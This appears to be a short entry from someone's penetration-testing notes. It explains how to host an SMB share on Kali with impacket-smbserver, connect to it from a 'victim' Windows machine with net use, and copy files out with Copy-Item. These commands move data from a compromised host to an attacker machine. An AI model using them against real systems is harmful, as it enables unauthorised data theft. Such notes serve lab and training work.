## SMB Share
<details>
on kali: make a folder called share then `impacket-smbserver -smb2support share ./share -username test -password test` then on victim `net use \\<kali ip>\share /user:test test` then `dir \\192.168.45.217\share` to confirm u can see the files in /share (maybe create a test.txt in it for checking purposes) then `Copy-Item "<path to file in windows>" "\\<kali ip>\share\<filename>"`
</details>
